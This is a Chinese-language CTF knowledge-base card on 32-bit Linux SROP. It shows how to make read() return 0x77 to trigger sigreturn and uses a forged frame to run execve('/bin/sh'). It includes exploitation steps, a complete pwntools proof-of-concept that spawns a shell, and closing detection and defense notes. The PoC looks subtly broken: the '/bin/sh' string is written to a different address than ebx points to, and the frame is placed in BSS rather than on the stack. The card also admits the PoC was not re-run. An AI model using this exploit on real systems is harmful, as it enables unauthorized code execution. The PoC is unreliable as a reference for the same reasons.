---
id: binary-pwn-stack-32bit-srop-read-return-sigreturn
title: 32 位 SROP：read 返回值置 eax=0x77，伪造 sigreturn frame 执行 execve("/bin/sh")
type: scenario
domain: binary
path: binary/pwn/stack
technique: i386-srop-read-return-sigreturn
tags:
- binary
- pwn
- srop
- sigreturn
- i386
- 32bit
- execve
- stack
- ctf
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V175
  verified_at: '2026-11-06T17:22:56+08:00'
  notes: 已对照原文 32 位 SROP 题核对：0x50 字节 frame、__NR_sigreturn=0x77、read 返回值置 eax、context.arch=i386/context.kernel=amd64、execve frame；原文 exp 含试错，卡为提炼后的通用 PoC，未在本机复跑。
url: /docs/binary/pwn/stack/binary-pwn-stack-32bit-srop-read-return-sigreturn/
draft: false
kb_aliases:
- 32 位 SROP
- i386 sigreturn
- read 返回值设置 eax
- SigreturnFrame 32 位
- int 0x80 SROP
- execve /bin/sh SROP
- 0x50 sigreturn frame
---

## 一句话结论

32 位 Linux 的 SROP 使用 0x50 字节的 sigreturn frame 和 `int 0x80`；如果栈可控但缺少设置寄存器的 gadget，可以让 `read` 返回 0x77（即 `__NR_sigreturn`）把 eax 置为 0x77，再跳到 syscall 指令触发 sigreturn，内核按伪造的 frame 恢复 `eax=0x0b, ebx="/bin/sh", ecx=0, edx=0, eip=syscall`，一次系统调用完成 `execve("/bin/sh", NULL, NULL)`。

## 原理

- **32 位 sigreturn**：i386 的 `__NR_sigreturn` 是 0x77（119）。执行该 syscall 时，内核从用户栈读取 `sigcontext`/`sigreturn` frame，恢复 gs/fs/es/ds/edi/esi/ebp/esp/ebx/edx/ecx/eax/eip/cs/eflags/esp_at_signal/ss 等寄存器，然后返回到 frame 中的 `eip`。frame 的第一段约 0x50 字节。
- **如何把 eax 置为 0x77**：32 位程序常用 `read(fd, buf, n)`，其返回值是实际读到的字节数，存放在 eax。把 `n` 设为 0x77 并让 read 成功读满 0x77 字节，返回后 eax=0x77；紧接着跳到 syscall 指令（`int 0x80` 或 `syscall` gadget），即执行 sigreturn。
- **frame 伪造**：用 pwntools `SigreturnFrame()`，设 `eax=0x0b`（execve）、`ebx=指向 "/bin/sh" 的地址`、`ecx=0`、`edx=0`、`eip=syscall`、`esp=可写栈地址`、`ebp=任意可写地址`。sigreturn 恢复后，CPU 从 `eip` 执行 syscall，此时寄存器正好是 execve 的参数。
- **为什么 32 位比 64 位“更自由”**：32 位参数主要通过栈传递，frame 中的 esp/ebp 可精确布局；read 的返回值为设置 eax 提供了天然通道，不需要额外 `pop eax; ret` gadget。缺点是 32 位 syscall 指令/调用约定与 64 位不同，pwntools 需要设置 `context.arch='i386'`，并按目标内核设置 `context.kernel`（如 `amd64`）以正确生成 syscall 指令。
- **触发链**：栈溢出覆盖返回地址 -> 跳到 `read` 读入 0x77 字节（同时覆盖下一段栈）-> read 返回 eax=0x77 -> 跳到 syscall gadget -> sigreturn -> execve("/bin/sh")。

## 触发条件

- 目标为 32 位 Linux ELF，存在栈溢出/可控返回地址。
- 有可用的 syscall 或 `int 0x80` gadget，以及可写内存存放 `"/bin/sh"`。
- `read` 可被调用且能控制读取长度与缓冲区；需要 read 返回 0x77（读满）。
- 没有 seccomp 拦截 `sigreturn`/`execve`；NX 不影响 SROP（不执行栈上代码）。

## 利用步骤

1. 找 gadget：`int 0x80; ret`/syscall gadget、`read` 地址、可写 BSS；保存 `"/bin/sh"` 到 BSS。
2. 构造栈溢出：返回到 `read(0, bss+..., 0x77)`，并将返回地址设为 syscall gadget。
3. 发送 0x77 字节，其中在栈上布置 `SigreturnFrame`（从 read 的 buf 开始），确保 read 读满使 eax=0x77。
4. read 返回后执行 syscall gadget -> sigreturn -> 按 frame 恢复寄存器 -> `execve("/bin/sh")`。
5. 若未成功，检查 frame 偏移（0x50 长度）、`context.arch/kernel`、`eip` 指向的 syscall 指令、`ebx` 字符串地址与栈对齐。

## PoC

```python
from pwn import *

context(os="linux", arch="i386", kernel="amd64", log_level="debug")
elf = ELF("./chall32")
io = process("./chall32")

syscall = 0x0806475d        # int 0x80; ret 或 syscall 指令
read_plt = elf.plt["read"]
bss = 0x080eda00
binsh = bss + 0x100
frame_addr = bss + 0x200

# 第一阶段：read(0, frame_addr, 0x77) 并把返回地址设为 syscall
payload = b"A" * 0x20
payload += p32(read_plt)
payload += p32(syscall)          # read 返回后跳 syscall，eax=0x77
payload += p32(0)                # fd
payload += p32(frame_addr)       # buf
payload += p32(0x77)             # count = 0x77
io.send(payload)

# 第二阶段：0x77 字节，前部为 "/bin/sh"，后部为 SigreturnFrame
frame = SigreturnFrame()
frame.eax = 0x0b                 # execve
frame.ebx = binsh
frame.ecx = 0
frame.edx = 0
frame.esp = bss + 0x300
frame.ebp = bss + 0x300
frame.eip = syscall

data = b"/bin/sh\x00".ljust(0x20, b"\x00") + bytes(frame)
io.send(data.ljust(0x77, b"\x00"))
io.interactive()
```

> 32 位调用约定下 read 的参数通过栈传递；实际 gadget/偏移按目标二进制调整。核心是让 read 返回 0x77，使 eax 等于 `__NR_sigreturn`。

## 变体与关联

- 变体：用 `pop eax; ret` 或 `xor eax,eax; inc` 等 gadget 直接设置 eax=0x77，不依赖 read 返回值。
- 变体：64 位 SROP 使用 0xF8 字节 frame、`syscall` 指令和 `rax=15`；已有 signal handler/连续 SROP 卡。
- 变体：`int 0x80` 与 `sysenter` 的返回路径不同，按目标内核选择。
- 关联卡片：[[ctf-pwn-signal-handler-rt-sigframe-srop-orw]]、[[binary-pwn-stack-sigaltstack-ucontext-sigreturn-hijack]]、[[binary-pwn-stack-ret2syscall-32bit]]、[[ctf-pwn-vfs-inode-link-permission-srop-orw]]。

## 检测与防御

- 检测：32 位进程栈上出现 0x50 字节的 sigcontext 结构；`read` 返回值为 0x77 后立即执行 syscall。
- 检测：seccomp 日志出现 `sigreturn` 或异常 `execve`；栈指针/帧地址落在 BSS 等可写段。
- 防御：seccomp 过滤 `sigreturn`（除合法信号处理外）；开启 NX/ASLR/PIE/Canary。
- 防御：编译时使用 `-fstack-protector`、`-z relro -z now`；避免暴露可控的 read 长度与栈溢出。
